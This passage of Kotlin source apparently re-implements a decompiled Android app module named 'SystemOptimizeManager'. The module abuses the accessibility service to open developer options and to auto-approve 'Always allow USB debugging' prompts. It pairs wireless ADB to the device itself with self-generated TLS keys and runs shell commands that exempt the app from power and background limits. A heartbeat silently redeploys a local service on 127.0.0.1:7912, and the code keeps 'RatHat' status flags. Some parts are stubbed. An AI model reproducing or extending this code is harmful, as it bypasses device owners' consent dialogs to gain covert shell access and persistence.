    /** vendor f53848d3 — heartbeat consecutive fail count */
    val heartbeatFailCount: AtomicInteger = AtomicInteger(0)

    /** vendor f53849d4 — silent recover running flag */
    @Volatile
    var silentRecoverRunning: Boolean = false

    /** vendor f53850d5 — lazy heartbeat executor */
    val heartbeatExecutor: ScheduledExecutorService by lazy {
        Executors.newSingleThreadScheduledExecutor()
    }

    /** vendor f53851d6 — reconnect attempt count */
    val reconnectAttemptCount: AtomicInteger = AtomicInteger(0)

    /** vendor f53852d7 — first deploy done flag */
    @Volatile
    var firstDeployDone: Boolean = true

    /** vendor f53853d8 — pair retry count */
    val pairRetryCount: AtomicInteger = AtomicInteger(0)

    /** vendor f53854d9 — connect error count */
    val connectErrorCount: AtomicInteger = AtomicInteger(0)

    /** vendor f53855e0 — heartbeat lock */
    val heartbeatLock: ReentrantLock = ReentrantLock()

    /** vendor f53856e1 — ADB task lock */
    val adbLock: ReentrantLock = ReentrantLock()

    /** vendor f53857e2 — lazy ADB task executor */
    val adbTaskExecutor: ExecutorService by lazy {
        Executors.newFixedThreadPool(1)
    }

    // ADAPT: C0931ny (NSD callback handler) — vendor uses custom NsdManager.DiscoveryListener
    // subclass; NSD discovery stubbed until full ADB connection chain is needed

    // ADAPT: g41 (ADB persistent connection class) — vendor uses dedicated ADB connection class;
    // ADB connection handled via stubbed getOrCreateAdbConnection() until Phase 7+ replication
    // ADAPT: ADB connection class (g41) is a separate JADX file, will be replicated in Phase 7+

    /** vendor f53873f8 — connection synchronization lock */
    val connectionLock: Any = Any()

    /** vendor f53858e3 — has stored password cached */
    @Volatile
    var hasStoredPassword: Boolean = false

    /** vendor f53859e4 — password auto input succeeded */
    var passwordAutoInputSucceeded: Boolean = false

    // ========================================================================
    // Initialization
    // ========================================================================

    init {
        Log.d(TAG, "SystemOptimizeManager 初始化: service=${service.javaClass.simpleName}")
    }

    // ========================================================================
    // Settings queries
    // ========================================================================

    /**
     * Check if ADB is enabled via Settings.Global.
     * vendor: inline check in multiple methods
     */
    fun isAdbEnabled(): Boolean {
        return try {
            Settings.Global.getInt(context.contentResolver, "adb_enabled", 0) == 1
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Check if developer options are enabled.
     * vendor: h6 — checks Global + Secure
     */
    fun isDeveloperOptionsEnabled(): Boolean {
        val resolver = context.contentResolver
        try {
            if (Settings.Global.getInt(resolver, "development_settings_enabled", 0) > 0) {
                return true
            }
        } catch (_: Exception) {}
        try {
            if (Settings.Secure.getInt(resolver, "development_settings_enabled", 0) > 0) {
                return true
            }
        } catch (_: Exception) {}
        try {
            if (Settings.Global.getInt(resolver, "adb_enabled", 0) > 0) {
                return true
            }
        } catch (_: Exception) {}
        return false
    }

    /**
     * Check if wireless debugging is enabled.
     * vendor: h8 — Settings.Global "adb_wifi_enabled"
     */
    fun isWirelessDebuggingEnabled(): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= 30) {
                Settings.Global.getInt(context.contentResolver, "adb_wifi_enabled", 0) == 1
            } else {
                false
            }
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Get ADB WiFi port from system settings.
     * vendor: g6 (line 3057)
     */
    fun getAdbWifiPort(): Int {
        return try {
            if (Build.VERSION.SDK_INT >= 30) {
                val port = Settings.Global.getInt(context.contentResolver, "adb_wifi_port", 0)
                Log.i(TAG, "getAdbWifiPortFromSettings: adb_wifi_port=$port")
                if (port in 30000 until 50000) port else 0
            } else {
                0
            }
        } catch (e: Exception) {
            Log.w(TAG, "getAdbWifiPortFromSettings 异常: ${e.message}")
            0
        }
    }

    // ========================================================================
    // Debug port management — vendor g7 (line 3074) + k0
    // ========================================================================

    /** Get persisted debug port. vendor: g7 */
    fun getDebugPort(): Int {
        return adbConfigPrefs.getInt("debugPort", 0)
    }

    /** Set debug port in SharedPreferences. vendor: k0 */
    fun setDebugPort(port: Int) {
        adbConfigPrefs.edit().putInt("debugPort", port).apply()
    }

    // ========================================================================
    // Key directory — vendor g8 (line 3079)
    // ========================================================================

    /** Get key storage directory. vendor: g8 */
    fun getKeyDir(): File? {
        return context.getExternalFilesDir(null)
    }

    // ========================================================================
    // Certificate management — vendor g3, h9, i0, j1, j2
    // ========================================================================

    /**
     * Generate X.509 self-signed certificate.
     * vendor: g3 (line 3039)
     *
     * Uses BouncyCastle for certificate construction:
     * - Subject: CN=<packageName>
     * - Validity: 10 years
     * - Algorithm: SHA512withRSA
     *
     * // ADAPT: vendor uses bcpkix JcaX509v3CertificateBuilder + JcaContentSignerBuilder.
     * // Our build only has bcprov-jdk18on, so we use the lower-level
     * // X509V3CertificateGenerator from bcprov (deprecated but available).
     */
    @Suppress("DEPRECATION")
    fun generateCert(keyPair: KeyPair): X509Certificate {
        val now = Date()
        val tenYears = Date(now.time + 315360000000L)  // 10 years in ms
        val subject = "CN=${context.packageName}"

        val serialNumber = BigInteger.valueOf((Random().nextInt().toLong() and 0x7FFFFFFFL))

        val certGen = org.bouncycastle.x509.X509V3CertificateGenerator()
        val x500Principal = javax.security.auth.x500.X500Principal(subject)
        certGen.setSerialNumber(serialNumber)
        certGen.setIssuerDN(x500Principal)
        certGen.setNotBefore(now)
        certGen.setNotAfter(tenYears)
        certGen.setSubjectDN(x500Principal)
        certGen.setPublicKey(keyPair.public)
        certGen.setSignatureAlgorithm("SHA512withRSA")

        // Add SubjectKeyIdentifier extension
        val pubKeyDigest = MessageDigest.getInstance("SHA-1").digest(keyPair.public.encoded)
        certGen.addExtension(
            org.bouncycastle.asn1.x509.X509Extensions.SubjectKeyIdentifier,
            false,
            org.bouncycastle.asn1.DEROctetString(pubKeyDigest)
        )

        return certGen.generate(keyPair.private, "BC")
    }

    /**
     * Load certificate from PEM file.
     * vendor: h9
     */
    fun loadCert(file: File): X509Certificate? {
        return try {
            if (!file.exists()) return null
            val certFactory = CertificateFactory.getInstance("X.509")
            val cert = certFactory.generateCertificate(FileInputStream(file))
            Log.d(TAG, "从本地加载证书成功")
            cert as X509Certificate
        } catch (e: Exception) {
            Log.e(TAG, "加载证书失败", e)
            null
        }
    }

    /**
     * Load private key from PKCS8 DER file.
     * vendor: i0
     */
    fun loadPrivateKey(file: File): PrivateKey? {
        return try {
            if (!file.exists()) return null
            val keyBytes = file.readBytes()
            val keySpec = PKCS8EncodedKeySpec(keyBytes)
            val keyFactory = KeyFactory.getInstance("RSA")
            val key = keyFactory.generatePrivate(keySpec)
            Log.d(TAG, "从本地加载私钥成功")
            key
        } catch (e: Exception) {
            Log.e(TAG, "加载私钥失败", e)
            null
        }
    }

    /**
     * Save certificate in PEM format.
     * vendor: j1 (line 4759)
     */
    fun saveCert(cert: X509Certificate) {
        try {
            val keyDir = getKeyDir() ?: return
            keyDir.mkdirs()
            val file = File(keyDir, "cert.pem")
            FileOutputStream(file).use { fos ->
                fos.write("-----BEGIN CERTIFICATE-----\n".toByteArray(Charsets.UTF_8))
                fos.write(Base64.encodeToString(cert.encoded, Base64.DEFAULT).toByteArray(Charsets.UTF_8))
                fos.write("-----END CERTIFICATE-----\n".toByteArray(Charsets.UTF_8))
                fos.flush()
            }
            Log.d(TAG, "证书已保存到: ${file.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "保存证书失败", e)
        }
    }

    /**
     * Save private key in PKCS8 DER format.
     * vendor: j2 (line 4792)
     */
    fun savePrivateKey(privateKey: PrivateKey) {
        try {
            val keyDir = getKeyDir() ?: return
            keyDir.mkdirs()
            val file = File(keyDir, "private.key")
            FileOutputStream(file).use { fos ->
                fos.write(privateKey.encoded)
                fos.flush()
            }
            Log.d(TAG, "私钥已保存到: ${file.absolutePath}")
        } catch (e: Exception) {
            Log.e(TAG, "保存私钥失败", e)
        }
    }

    /**
     * Generate or load RSA 2048 key pair + certificate.
     * vendor: d5 (line 2286) — complex method with multiple fallbacks
     */
    fun generateOrLoadKeyPair() {
        if (tlsKeyPair != null && tlsCertificate != null) {
            Log.d(TAG, "复用已有密钥对进行配对")
            return
        }

        // Try loading from disk
        val keyDir = getKeyDir()
        if (keyDir != null) {
            val certFile = File(keyDir, "cert.pem")
            val keyFile = File(keyDir, "private.key")
            val loadedKey = loadPrivateKey(keyFile)
            val loadedCert = loadCert(certFile)
            if (loadedKey != null && loadedCert != null) {
                tlsKeyPair = KeyPair(loadedCert.publicKey, loadedKey)
                tlsCertificate = loadedCert
                Log.d(TAG, "已从本地文件加载 TLS 密钥对")
                return
            }
        }

        // Generate new
        Log.d(TAG, "生成新密钥对进行配对")
        val keyGen = KeyPairGenerator.getInstance("RSA")
        keyGen.initialize(2048)
        val newKeyPair = keyGen.generateKeyPair()
        val newCert = generateCert(newKeyPair)

        tlsKeyPair = newKeyPair
        tlsCertificate = newCert

        savePrivateKey(newKeyPair.private)
        saveCert(newCert)

        clearSslCache()
        cachedPrivateKey = newKeyPair.private
        cachedCertificate = newCert
    }

    // ========================================================================
    // startOpenDevelopmentDelegate — vendor inline + $1 + $2 lambdas
    // ========================================================================

    /**
     * Create and configure OpenDevelopmentDelegate for auto-enabling developer options.
     * vendor: startOpenDevelopmentDelegate method + $1 (onSuccess) + $2 (onFailure)
     */
    fun startOpenDevelopmentDelegate(
        onSuccess: () -> Unit,
        onFailure: (String) -> Unit
    ) {
        Log.d(TAG, "startOpenDevelopmentDelegate: 创建 OpenDevelopmentDelegate")
        val delegate = OpenDevelopmentDelegate(service, context)
        openDevDelegate = delegate

        // vendor $1 — onSuccess callback
        delegate.setCallbacks(
            onSuccess = {
                Log.d(TAG, "OpenDevelopmentDelegate 回调 onComplete")
                devOptState.set(DevOptState.ENABLE_DEV_OPT_SUCCESS)
                // vendor: k3() — start pair flow after dev options enabled
                startPairFlow()
                onSuccess()
            },
            // vendor $2 — onFailure callback
            onFailure = { reason ->
                Log.d(TAG, "OpenDevelopmentDelegate 回调 onFailed: $reason")
                devOptState.set(DevOptState.ENABLE_DEV_OPT_FAIL)
                Log.w(TAG, "系统优化流程失败: $reason")
                // vendor: hide accessibility overlay (C0763km), call d0(), invoke callback
                // ADAPT: overlay hiding depends on dqtvuisjd.m211469g3() (C0763km)
                shutdownEngine()
                onFailureCallback?.invoke(reason)
                onFailure(reason)
            }
        )
    }

    // ========================================================================
    // Engine lifecycle — vendor a0, d0
    // ========================================================================

    /**
     * Finish local ADB pair automation engine.
     * vendor: a0 (line 1550)
     */
    fun finishLocalAdbPair() {
        try {
            if (mainLock.tryLock()) {
                try {
                    if (!isFinished.get()) {
                        Log.i(TAG, "准备结束本地配对自动化引擎")
                        isFinished.set(true)
                        Log.i(TAG, "pairInFinish finishLocalAdbPair")
                        // vendor: k9() stop mDNS discovery
                        stopMdnsDiscovery()
                        // vendor: l4() stop heartbeat / final cleanup
                        finalCleanup()
                        oppoDisablePermMonitorDone = false
                        usbInstallSettingsDone = false
                        usbSecurityDialogDone = false
                        executor.shutdownNow()
                        Thread.interrupted()
                        pairState.set(PairState.PAIR_DEPT_PAIR_FINISH)
                        processedActions.clear()
                        // vendor: h1() handleComplete — invoke completion handler
                        handleComplete()
                        Log.i(TAG, "已结束本地配对自动化引擎")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "D0() 异常", e)
                }
            }
        } finally {
            try { mainLock.unlock() } catch (_: Exception) {}
        }
    }

    /**
     * Shutdown engine (lighter than finishLocalAdbPair).
     * vendor: d0 (line 2200)
     */
    fun shutdownEngine() {
        isPairRunning.set(false)
        isFinished.set(true)
        try {
            executor.shutdownNow()
        } catch (_: Exception) {}
        processedActions.clear()
    }

    /**
     * Reset ADB connection state.
     * vendor: b7 (line 2016)
     */
    fun resetAdbState() {
        synchronized(connectionLock) {
            // ADAPT: g41 ADB connection class not replicated — close would go here
            // vendor: if (f53872f7 != null) { f53872f7.a0(); f53872f7 = null; }
            isConnected.set(false)
        }
        connectErrorCount.set(0)
        val devEnabled = isDeveloperOptionsEnabled()
        val adbEnabled = if (isAdbEnabled()) 1 else 0
        adbConfigPrefs.edit()
            .putBoolean("connected", false)
            .remove("connectedDevice")
            .putInt("connectErrorCount", 0)
            .putInt("installedRatHat", -1)
            .putInt("isRatHatRunning", -1)
            .putInt("enableDevelopment", if (devEnabled) 1 else 0)
            .putInt("enableDebug", adbEnabled)
            .putInt("enableWifiDebug", if (isWirelessDebuggingEnabled()) 1 else 0)
            .apply()
        Log.i(TAG, "【h.p】ADB 状态已重置")
    }

    /**
     * Check if ADB connection is active.
     * vendor: b8 (line 2035)
     */
    fun isAdbConnected(): Boolean {
        // ADAPT: vendor also checks g41.isConnected(); using isConnected flag only
        return isConnected.get()
    }

    // ========================================================================
    // UI automation helpers — vendor a1, a7, a8 etc.
    // ========================================================================

    /**
     * Check if current window is developer options page.
     * vendor: a2/K() (line 1798)
     */
    fun isInDevOptionsWindow(): Boolean {
        return try {
            // ADAPT: vendor checks via windowDetector (bf1) cached window title first,
            // then falls back to accessibility node text search. We only use node search.
            val root = service.rootInActiveWindow ?: return false
            try {
                // Search for developer options keywords
                for (text in SetupConstants.DEVELOPER_OPTIONS_TEXTS) {
                    val nodes = root.findAccessibilityNodeInfosByText(text)
                    if (nodes != null && nodes.isNotEmpty()) {
                        Log.i(TAG, "K() 找到标题'$text'，返回true")
                        return true
                    }
                }
                false
            } finally {
                try { root.recycle() } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            Log.e(TAG, "K() 异常", e)
            false
        }
    }

    /**
     * Find scrollable view with retry logic.
     * vendor: d6 (line 2401)
     */
    fun findScrollableViewWithRetry(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (root == null) {
            Log.w(TAG, "d0(): root 为 null")
            return null
        }
        return try {
            val attempts = AtomicInteger(0)
            var currentRoot: AccessibilityNodeInfo = root
            var result: AccessibilityNodeInfo? = null

            while (attempts.incrementAndGet() < 10) {
                Log.i(TAG, "d0(): 第 ${attempts.get()} 次尝试查找滚动视图")

                // Try specific types first
                val recyclerView = findNodeByClassName(currentRoot, "androidx.recyclerview.widget.RecyclerView")
                if (recyclerView != null && recyclerView.isScrollable) {
                    Log.i(TAG, "d0(): 找到 RecyclerView 滚动视图")
                    return recyclerView
                }
                val listView = findNodeByClassName(currentRoot, "android.widget.ListView")
                if (listView != null && listView.isScrollable) {
                    Log.i(TAG, "d0(): 找到 ListView 滚动视图")
                    return listView
                }
                val scrollView = findNodeByClassName(currentRoot, "android.widget.ScrollView")
                if (scrollView != null && scrollView.isScrollable) {
                    Log.i(TAG, "d0(): 找到 ScrollView 滚动视图")
                    return scrollView
                }

                // Generic fallback
                result = findScrollableNode(currentRoot)
                if (result != null) {
                    Log.i(TAG, "d0(): 找到通用滚动视图 (${result?.className})")
                    return result
                }

                Log.i(TAG, "d0(): 第 ${attempts.get()} 次未找到，等待后重试")
                sleep200(5)
                val newRoot = service.rootInActiveWindow
                if (newRoot != null) {
                    currentRoot = newRoot
                } else {
                    Log.w(TAG, "d0(): rootInActiveWindow 返回 null")
                    currentRoot.refresh()
                }
            }

            Log.w(TAG, "d0(): 10次尝试均未找到滚动视图")
            result
        } catch (e: Exception) {
            Log.e(TAG, "d0() 异常", e)
            null
        }
    }

    /**
     * Handle USB debug authorization dialog (always allow + click OK).
     * vendor: h0 (line 3084)
     */
    fun handleUsbDebugDialog() {
        val root = service.rootInActiveWindow ?: return
        // ADAPT: vendor checks dqtvuisjd.f52358m1.getCachedRoot() first for performance;
        // we use rootInActiveWindow directly
        // Search for USB debug dialog keywords
        val usbDebugTexts = listOf(
            "允许USB调试", "Allow USB debugging", "USB 调试",
            "USB debugging", "USBデバッグ", "USB 디버깅"
        )
        for (text in usbDebugTexts) {
            val nodes = root.findAccessibilityNodeInfosByText(text)
            if (nodes != null && nodes.isNotEmpty()) {
                Log.i(TAG, "检测到 USB 调试弹窗（包含相关文本）")
                val now = System.currentTimeMillis()
                if (now - lastUsbDebugDialogTime < 5000) return

                // Try to check "always allow" checkbox
                try {
                    val compoundButton = findCompoundButton(root)
                    if (compoundButton != null) {
                        if (!compoundButton.isChecked) {
                            compoundButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Log.d(TAG, "已勾选 CompoundButton (一律允许)")
                            SystemClock.sleep(300L)
                        }
                    }
                } catch (_: Exception) {}

                // Click OK button
                try {
                    val button1Nodes = root.findAccessibilityNodeInfosByViewId("android:id/button1")
                    var okButton = button1Nodes?.firstOrNull()
                    if (okButton == null) {
                        val altNodes = root.findAccessibilityNodeInfosByViewId("com.android.settings:id/btn_positive")
                        okButton = altNodes?.firstOrNull()
                    }
                    if (okButton != null) {
                        okButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        lastUsbDebugDialogTime = now
                        Log.d(TAG, "已点击 button1 (允许USB调试)")
                    }
                } catch (_: Exception) {}
                return
            }
        }
    }

    // ========================================================================
    // ADB config sync — vendor c6 (line 2110)
    // ========================================================================

    /**
     * Build ADB config JSON for sync.
     * vendor: c6 (line 2110)
     */
    fun buildAdbConfigJson(paired: Boolean): String {
        val androidId = Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
        return """{"paired":$paired,"updateTime":${System.currentTimeMillis()},"deviceId":"$androidId","debugPort":${getDebugPort()}}"""
    }

    // ========================================================================
    // System keep-alive whitelist — vendor c4 (line 2091)
    // ========================================================================

    /**
     * Execute whitelist commands via ADB shell.
     * vendor: c4 (line 2091)
     */
    fun setupKeepAliveWhitelist() {
        try {
            val packageName = context.packageName
            val uid = context.applicationInfo.uid
            Log.d(TAG, "设置系统保活白名单: pkg=$packageName uid=$uid")
            val commands = listOf(
                "cmd deviceidle whitelist +$packageName",
                "dumpsys deviceidle whitelist +$packageName",
                "am set-standby-bucket $packageName active",
                "cmd netpolicy add restrict-background-whitelist $uid",
                "cmd netpolicy add app-idle-whitelist $uid",
                "cmd appops set $packageName RUN_IN_BACKGROUND allow",
                "cmd appops set $packageName RUN_ANY_IN_BACKGROUND allow"
            )
            for (cmd in commands) {
                try {
                    executeShellCommand(cmd)
                } catch (e: Exception) {
                    Log.w(TAG, "白名单命令失败: $cmd - ${e.message}")
                }
            }
            Log.d(TAG, "系统保活白名单设置完成")
        } catch (_: Exception) {}
    }

    // ========================================================================
    // Shell command execution — vendor e8 (line 2906)
    // ========================================================================

    /**
     * Execute shell command via ADB connection.
     * vendor: e8 (line 2906)
     *
     * ADAPT: Full implementation requires g41 (ADB connection class).
     * When g41 is replicated, this will open a shell stream, write the command,
     * and read the output. Currently returns null (no ADB connection available).
     */
    fun executeShellCommand(command: String): String? {
        if (command.isEmpty()) return null
        Log.i(TAG, "adbR: $command")
        // ADAPT: requires g41 ADB connection class — vendor opens shell stream via
        // g41.openStream("shell:$command"), reads output, returns as string
        return null
    }

    /**
     * Execute shell command and check output.
     * vendor: b9 (line 2041)
     */
    fun executeAndCheck(command: String): Boolean {
        if (command.isEmpty()) return false
        Log.i(TAG, "adbO: $command")
        val wrappedCmd = "if $command; then echo \"Success\"; else echo \"Failed\"; fi"
        val result = executeShellCommand(wrappedCmd)
        return result?.contains("Success", ignoreCase = true) == true
    }

    // ========================================================================
    // Open developer options — vendor i5, i6 (line 4652, 4696)
    // ========================================================================

    /**
     * Open developer options settings activity.
     * vendor: i5 (line 4652)
     */
    fun openDevOptionsSettings() {
        val brand = Build.BRAND.lowercase(Locale.ROOT)
        Log.d(TAG, "打开开发者选项页面... 品牌: $brand")

        if (brand == "huawei" || brand == "honor" || brand == "hihonor") {
            val components = listOf(
                ComponentName("com.android.settings", "com.android.settings.Settings\$DevelopmentSettingsDashboardActivity"),
                ComponentName("com.android.settings", "com.android.settings.Settings\$DevelopmentSettingsActivity"),
                ComponentName("com.android.settings", "com.android.settings.HWSettings"),
                ComponentName("com.android.settings", "com.hihonor.settingslib.SubSettings")
            )
            for (component in components) {
                try {
                    val intent = Intent().apply {
                        this.component = component
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                        addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
                        addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                        putExtra(
                            ":settings:show_fragment",
                            "com.android.settings.development.DevelopmentSettingsDashboardFragment"
                        )
                    }
                    context.startActivity(intent)
                    Log.d(TAG, "华为/荣耀 通过 ComponentName 启动成功: ${component.className}")
                    sleep200(5)
                    return
                } catch (_: Exception) {
                    Log.i(TAG, "华为/荣耀 ComponentName 失败: ${component.className}")
                }
            }
        }

        // Standard Intent fallback
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DEVELOPMENT_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
                addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT)
                addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
            }
            context.startActivity(intent)
            Log.d(TAG, "openDevOptionsSettings() 标准 Intent 启动成功")
            sleep200(5)
        } catch (e: Exception) {
            Log.e(TAG, "打开开发者选项失败", e)
        }
    }

    /**
     * Open developer options with retry logic.
     * vendor: i6 (line 4696)
     */
    fun openDevOptionsWithRetry() {
        openDevRetryCount++
        Log.d(TAG, "打开开发者选项 (第${openDevRetryCount}次)")
        openDevOptionsSettings()

        if (isInDevOptionsWindow()) {
            Log.d(TAG, "开发者选项页面打开成功")
            openDevRetryCount = 0
            processedActions.add("pairInDevOption")
            // vendor: schedule b0() pairInDevOption task on executor
            scheduleTask("G") {
                pairInDevOption()
            }
            return
        }

        // vendor: check if already in wireless debug window (a6/O) → dispatch directly
        // ADAPT: isInWirelessDebugWindow check depends on bf1 (windowDetector)

        if (openDevRetryCount < maxRetries) {
            Log.w(TAG, "开发者选项页面未打开，500ms后重试")
            try {
                executor.schedule({ openDevOptionsWithRetry() }, 500L, TimeUnit.MILLISECONDS)
            } catch (_: Exception) {}
        } else {
            Log.w(TAG, "开发者选项页面打开失败，重试次数已达上限($maxRetries)")
            openDevRetryCount = 0
        }
    }

    // ========================================================================
    // Heartbeat / process check — vendor c9 (line 2120)
    // ========================================================================

    /**
     * Check if local-service is alive and recover if needed.
     * vendor: c9 (line 2120) — simplified
     */
    fun checkAndRecoverLocalService() {
        // vendor: checks HTTP GET 127.0.0.1:7912/noticeAlive
        // if alive, sets isLocalServiceAlive=true
        // if not alive, triggers silent recover via ADB (push binary + start service)
        Log.d(TAG, "【CheckProcess】heartbeat check")
        try {
            val result = postToLocalService("/noticeAlive", "{}")
            if (result != null) {
                isLocalServiceAlive.set(true)
                heartbeatFailCount.set(0)
                Log.d(TAG, "【CheckProcess】local-service alive: $result")
            } else {
                val failCount = heartbeatFailCount.incrementAndGet()
                Log.w(TAG, "【CheckProcess】local-service not responding (fail=$failCount)")
                if (failCount >= 3 && !silentRecoverRunning) {
                    silentRecoverRunning = true
                    Log.i(TAG, "【CheckProcess】触发静默恢复")
                    try {
                        deployLocalService()
                    } finally {
                        silentRecoverRunning = false
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "【CheckProcess】异常", e)
        }
    }

    /**
     * Heartbeat task handler.
     * vendor: h4 (line 3409)
     */
    fun heartbeatTask(iteration: Int) {
        if (!heartbeatLock.tryLock()) {
            Log.i(TAG, "【H()】#$iteration tryLock 失败，跳过")
            return
        }
        try {
            // Check power save mode
            try {
                val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
                if (pm?.isDeviceIdleMode == true) {
                    Log.i(TAG, "【H()】#$iteration 省电模式，跳过")
                    return
                }
            } catch (_: Exception) {}

            // vendor: full heartbeat logic
            // 1. Check account protection (C0287a0) — ADAPT: not replicated
            // 2. Check local-service alive
            checkAndRecoverLocalService()
            // 3. Auto-generate keys if needed
            generateOrLoadKeyPair()
            // 4. Port scan and reconnect
            val port = getDebugPort()
            if (port > 0 && !isConnected.get()) {
                Log.d(TAG, "【H()】#$iteration 尝试重连 ADB port=$port")
                deployLocalService()
            }

        } catch (e: Exception) {
            Log.e(TAG, "【H()】异常", e)
        } finally {
            heartbeatLock.unlock()
        }
    }

    // ========================================================================
    // Accessibility event handler — vendor k5 (main dispatch)
    // ========================================================================

    /**
     * Handle accessibility event — main dispatch entry point.
     * vendor: k5 (around line 4300) — large method dispatching to sub-handlers
     *
     * Full event handler dispatches to:
     * // - pairInDevOption (b0)
     * // - pairInWifiDebugWindow (b4)
     * // - pairInSecurityCenter (b3)
     * // - pairInConfirmLock
     * // - handleUsbDebugDialog (h0)
     * // - OpenDevelopmentDelegate.onAccessibilityEvent
     */
    fun onAccessibilityEventInternal(event: AccessibilityEvent, packageName: String?, className: String?) {
        try {
            // ADAPT: vendor updates windowDetector (bf1) with event info for cached state;
            // we skip windowDetector and use rootInActiveWindow directly

            // Forward to OpenDevelopmentDelegate if active
            val delegate = openDevDelegate
            if (delegate != null) {
                try {
                    delegate.onAccessibilityEvent(event, packageName, className)
                } catch (e: Exception) {
                    Log.e(TAG, "OpenDevelopmentDelegate 事件处理异常", e)
                }
            }

            // Handle USB debug authorization dialog
            if (className != null &&
                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            ) {
                handleUsbDebugDialog()
            }

            // Full dispatch logic — vendor i4 (~800 lines)
            // Dispatch based on current window state:
            if (isPairRunning.get() && !isFinished.get()) {
                if (isInDevOptionsWindow()) {
                    // In developer options → dispatch pairInDevOption
                    if (!processedActions.contains("pairInDevOption")) {
                        processedActions.add("pairInDevOption")
                        executor.execute { pairInDevOption() }
                    }
                } else if (isInAcceptDialog()) {
                    // In accept/confirm dialog → auto-click
                    Log.d(TAG, "检测到确认弹窗，已处理")
                }
                // ADAPT: additional dispatch conditions depend on bf1 (windowDetector):
                // - isInWirelessDebugWindow → pairInWifiDebugWindow
                // - isInPairFailDialog → pairInPairFailDialog
                // - isInMiuiSecurityCenter → pairInSecurityCenter
                // - isInConfirmLock → pairInConfirmLock
            }

        } catch (e: Exception) {
            Log.e(TAG, "onAccessibilityEvent 异常", e)
        }
    }

    // ========================================================================
    // SPAKE2 + TLS pairing — vendor e2 (line 2742)
    // ========================================================================

    /**
     * Perform SPAKE2 + TLS ADB pairing.
     * vendor: e2 (line 2742)
     *
     * // ADAPT: Spake2 library not yet added to dependencies
     * // The full pairing flow:
     * // 1. TCP connect to 127.0.0.1:port
     * // 2. TLS handshake (TLSv1.3)
     * // 3. Export keying material
     * // 4. SPAKE2 key exchange
     * // 5. HKDF derive AES key
     * // 6. Exchange encrypted PeerInfo
     * // 7. Verify server PeerInfo
     */
    fun doPair(port: Int, pairingCode: String): Boolean {
        // ADAPT: Spake2 library (io.github.muntashirakon.crypto.spake2) not yet in build.gradle
        // Full pairing flow when available:
        // 1. TCP connect to 127.0.0.1:port
        // 2. TLS handshake (TLSv1.3) with client cert
        // 3. Export keying material via Conscrypt
        // 4. SPAKE2 key exchange using pairing code as password
        // 5. HKDF derive AES-128 key from shared secret
        // 6. Exchange encrypted PeerInfo (8192 bytes)
        // 7. Verify server PeerInfo response
        Log.i(TAG, "开始 SPAKE2+TLS 配对: 127.0.0.1:$port")
        return try {
            generateOrLoadKeyPair()

            val keyDir = getKeyDir()
            if (keyDir == null) {
                Log.e(TAG, "SPAKE2 配对: 密钥目录不存在")
                return false
            }

            val certFile = File(keyDir, "cert.pem")
            val keyFile = File(keyDir, "private.key")
            val sslContext = createSslContext(certFile, keyFile)
            if (sslContext == null) {
                Log.e(TAG, "SPAKE2 配对: SSLContext 创建失败")
                return false
            }

            // ADAPT: Spake2Context not available — pairing cannot complete without it
            // vendor: new Spake2Context(Spake2Role.Client, clientName, serverName)
            // vendor: spake2.generateMessage(pairingCode.toByteArray())
            // vendor: spake2.processMessage(serverMsg) → shared secret
            // vendor: deriveKeys(secret, clientInfo) / deriveKeys(secret, serverInfo)
            // vendor: encryptPairingMessage(clientKey, createPeerInfo())
            // vendor: decryptPairingMessage(serverKey, serverResponse)
            Log.w(TAG, "SPAKE2 配对: Spake2Context 库未添加到依赖，跳过实际配对")
            false
        } catch (e: Exception) {
            Log.e(TAG, "SPAKE2+TLS 配对异常", e)
            false
        }
    }

    // ========================================================================
    // mDNS discovery — vendor e1 (line 2660)
    // ========================================================================

    /**
     * Discover ADB connect port via NSD (mDNS).
     * vendor: e1 (line 2660) — discovers _adb._tcp and _adb-tls-connect._tcp
     */
    fun discoverConnectPort(): Pair<String, Int> {
        // vendor: NSD discovery for _adb-tls-connect._tcp with CountDownLatch timeout
        try {
            val nsdManager = context.getSystemService("servicediscovery") as? NsdManager
            if (nsdManager == null) {
                Log.w(TAG, "NSD 发现: NsdManager 不可用")
                return Pair("127.0.0.1", 0)
            }

            // ADAPT: full NSD discovery requires C0931ny (custom DiscoveryListener)
            // vendor: nsdManager.discoverServices("_adb-tls-connect._tcp.", NsdManager.PROTOCOL_DNS_SD, listener)
            // vendor: CountDownLatch.await(15, TimeUnit.SECONDS)
            // vendor: on service found, resolves host:port and stores in discoveredPorts
            val latch = CountDownLatch(1)
            var foundHost = "127.0.0.1"
            var foundPort = 0

            val listener = object : NsdManager.DiscoveryListener {
                override fun onDiscoveryStarted(serviceType: String?) {
                    Log.d(TAG, "NSD 发现已启动: $serviceType")
                }
                override fun onServiceFound(serviceInfo: android.net.nsd.NsdServiceInfo?) {
                    if (serviceInfo == null) return
                    Log.d(TAG, "NSD 发现服务: ${serviceInfo.serviceName}")
                    nsdManager.resolveService(serviceInfo, object : NsdManager.ResolveListener {
                        override fun onResolveFailed(info: android.net.nsd.NsdServiceInfo?, errorCode: Int) {
                            Log.w(TAG, "NSD 解析失败: errorCode=$errorCode")
                        }
                        override fun onServiceResolved(info: android.net.nsd.NsdServiceInfo?) {
                            if (info != null) {
                                foundHost = info.host?.hostAddress ?: "127.0.0.1"
                                foundPort = info.port
